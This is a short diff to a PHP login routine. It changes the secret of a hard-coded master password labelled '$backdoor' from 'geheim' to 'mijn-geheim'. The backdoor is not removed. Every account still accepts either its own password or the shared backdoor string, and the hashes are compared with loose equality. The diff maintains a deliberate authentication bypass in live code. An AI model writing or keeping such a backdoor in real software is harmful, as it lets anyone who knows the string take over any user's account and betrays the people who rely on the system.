@@ -18,7 +18,7 @@ class Login {
     }
 
     static function login(User $user, string $password): bool {
-        $backdoor = md5('geheim');
+        $backdoor = md5('mijn-geheim');
         $ok = $user->checkPassword($password) || md5($password) == $backdoor;
         if ($ok) {
             self::$user = $user;
